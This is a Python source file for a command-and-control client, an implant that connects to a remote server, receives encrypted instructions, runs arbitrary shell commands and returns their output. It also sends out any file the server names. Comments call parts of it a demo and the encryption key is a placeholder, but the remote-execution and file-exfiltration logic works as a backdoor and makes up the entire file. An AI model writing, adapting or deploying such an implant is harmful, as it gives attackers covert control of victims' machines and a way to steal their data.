import socket
import threading
import logging
import json
import time
import subprocess
import os
from cryptography.fernet import Fernet

class C2Client:
    def __init__(self, server_ip, server_port=8080):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.connected = False
        self.logger = logging.getLogger(__name__)
        self.key = None
        self.cipher = None

    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.connected = True
            self.logger.info(f"Connected to C2 server at {self.server_ip}:{self.server_port}")

            # Receive encryption key (in real implementation, this would be pre-shared)
            # For demo purposes, we'll use a hardcoded key
            self.key = b'YourSuperSecretKeyHere123456789012='  # 32 bytes
            self.cipher = Fernet(self.key)

            # Start heartbeat thread
            heartbeat_thread = threading.Thread(target=self.send_heartbeat)
            heartbeat_thread.daemon = True
            heartbeat_thread.start()

            # Start command listener
            self.listen_for_commands()

        except Exception as e:
            self.logger.error(f"Failed to connect to C2 server: {e}")
            self.connected = False

    def encrypt_message(self, message):
        return self.cipher.encrypt(message.encode())

    def decrypt_message(self, encrypted_message):
        return self.cipher.decrypt(encrypted_message).decode()

    def send_heartbeat(self):
        while self.connected:
            try:
                heartbeat = {'type': 'heartbeat', 'timestamp': time.time()}
                encrypted_heartbeat = self.encrypt_message(json.dumps(heartbeat))
                self.socket.send(encrypted_heartbeat)
                time.sleep(30)  # Send heartbeat every 30 seconds
            except:
                self.connected = False
                break

    def execute_command(self, command):
        try:
            if os.name == 'nt':  # Windows
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            else:  # Unix-like
                result = subprocess.run(command.split(), capture_output=True, text=True, timeout=30)

            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Command timed out'}
        except Exception as e:
            return {'error': str(e)}

    def listen_for_commands(self):
        while self.connected:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break

                decrypted_data = self.decrypt_message(data)
                command = json.loads(decrypted_data)

                self.logger.info(f"Received command: {command}")

                # Execute command
                if command.get('type') == 'execute':
                    cmd = command.get('command', '')
                    result = self.execute_command(cmd)

                    # Send result back
                    response = {
                        'type': 'result',
                        'command': cmd,
                        'result': result
                    }
                    encrypted_response = self.encrypt_message(json.dumps(response))
                    self.socket.send(encrypted_response)

                elif command.get('type') == 'upload':
                    # Simulate file upload
                    filename = command.get('filename', 'uploaded_file')
                    with open(filename, 'wb') as f:
                        f.write(b'Uploaded file content')
                    response = {'status': 'uploaded', 'filename': filename}
                    encrypted_response = self.encrypt_message(json.dumps(response))
                    self.socket.send(encrypted_response)

                elif command.get('type') == 'download':
                    # Simulate file download
                    filename = command.get('filename', 'system_info.txt')
                    with open(filename, 'rb') as f:
                        file_data = f.read()
                    response = {
                        'status': 'downloaded',
                        'filename': filename,
                        'data': file_data.decode('latin-1')  # Simple encoding for demo
                    }
                    encrypted_response = self.encrypt_message(json.dumps(response))
                    self.socket.send(encrypted_response)

            except Exception as e:
                self.logger.error(f"Error processing command: {e}")
                self.connected = False
                break

        self.socket.close()
        self.logger.info("Disconnected from C2 server")